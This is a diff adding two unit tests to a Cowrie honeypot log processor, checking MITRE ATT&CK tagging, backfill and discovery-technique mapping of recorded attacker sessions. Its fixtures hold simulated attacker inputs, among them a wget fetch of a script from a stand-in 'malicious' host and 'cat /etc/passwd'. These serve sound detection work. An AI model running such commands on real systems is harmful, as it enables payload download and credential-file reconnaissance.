@@ -262,6 +262,88 @@ class ProcessorFlowTest(unittest.TestCase):
         self.assertIn("Report incidente", html_report.read_text(encoding="utf-8"))
         self.assertEqual(json.loads(json_report.read_text(encoding="utf-8"))["event"]["id"], post_login["id"])
 
+    def test_events_are_enriched_with_mitre_and_backfilled_on_reconcile(self):
+        processor = self._processor()
+        base = {
+            "src_ip": "192.0.2.80",
+            "timestamp": "2026-04-29T18:00:00Z",
+            "protocol": "ssh",
+            "session": "session-mitre",
+        }
+        self._append_json(self.cowrie_log, {
+            **base,
+            "eventid": "cowrie.login.success",
+            "username": "admin",
+            "password": "password",
+        })
+        self._append_json(self.cowrie_log, {
+            **base,
+            "eventid": "cowrie.command.input",
+            "input": "wget http://malicious/x.sh",
+        })
+
+        self.assertEqual(processor.process_once(), 2)
+        events = {event["attack_type"]: event for event in self.db.fetch_events()}
+
+        login = events["Unauthorized Login"]
+        self.assertEqual(login["mitre_technique"], "T1078")
+        self.assertEqual(login["mitre_technique_name"], "Valid Accounts")
+        self.assertEqual(login["mitre_subtechnique"], "T1078.003")
+        self.assertEqual(login["mitre_confidence"], "Alto")
+        self.assertEqual(login["mitre_url"], "https://attack.mitre.org/techniques/T1078/003/")
+        self.assertFalse(login["mitre_uncertain"])
+
+        cmd = events["Command Injection"]
+        self.assertEqual(cmd["mitre_technique"], "T1059")
+        self.assertEqual(cmd["mitre_subtechnique"], "T1059.004")
+
+        # Backfill: simulo righe storiche azzerando le colonne MITRE e ricreando
+        # il Processor (che esegue reconcile_events all'avvio).
+        with self.db.get_conn() as conn:
+            conn.execute('UPDATE events SET mitre_tactic = NULL, mitre_technique = NULL, '
+                         'mitre_subtechnique = NULL, mitre_confidence = NULL')
+            conn.commit()
+        self.assertTrue(all(e["mitre_technique"] is None for e in self.db.fetch_events()))
+
+        self._processor()  # reconcile_events ripopola i campi MITRE
+        backfilled = {event["attack_type"]: event for event in self.db.fetch_events()}
+        self.assertEqual(backfilled["Unauthorized Login"]["mitre_technique"], "T1078")
+        self.assertEqual(backfilled["Command Injection"]["mitre_subtechnique"], "T1059.004")
+
+    def test_incident_detail_exposes_discovery_techniques(self):
+        processor = self._processor()
+        base = {
+            "src_ip": "192.0.2.90",
+            "timestamp": "2026-04-29T18:00:00Z",
+            "protocol": "ssh",
+            "session": "session-discovery",
+        }
+        self._append_json(self.cowrie_log, {
+            **base, "eventid": "cowrie.login.success",
+            "username": "admin", "password": "password",
+        })
+        for cmd in ["whoami", "uname -a", "cat /etc/passwd", "netstat -an", "sdaf"]:
+            self._append_json(self.cowrie_log, {
+                **base, "eventid": "cowrie.command.input", "input": cmd,
+            })
+
+        processor.process_once()
+        events = {e["attack_type"]: e for e in self.db.fetch_events()}
+        post_login = events["Post-Login Activity"]
+
+        detail = self.db.fetch_incident_detail(post_login["id"])
+        discovery_ids = {item["id"] for item in detail["discovery"]}
+        self.assertIn("T1033", discovery_ids)        # whoami
+        self.assertIn("T1082", discovery_ids)        # uname
+        self.assertIn("T1087.001", discovery_ids)    # cat /etc/passwd
+        self.assertIn("T1049", discovery_ids)        # netstat
+        # il rumore "sdaf" non produce technique
+        for item in detail["discovery"]:
+            self.assertEqual(item["tactic"], "TA0007")
+
+        ip_detail = self.db.fetch_ip_detail("192.0.2.90")
+        self.assertIn("T1033", {item["id"] for item in ip_detail["discovery"]})
+
     def test_reset_attacks_clears_incidents_raw_context_and_export(self):
         processor = self._processor()
         base = {
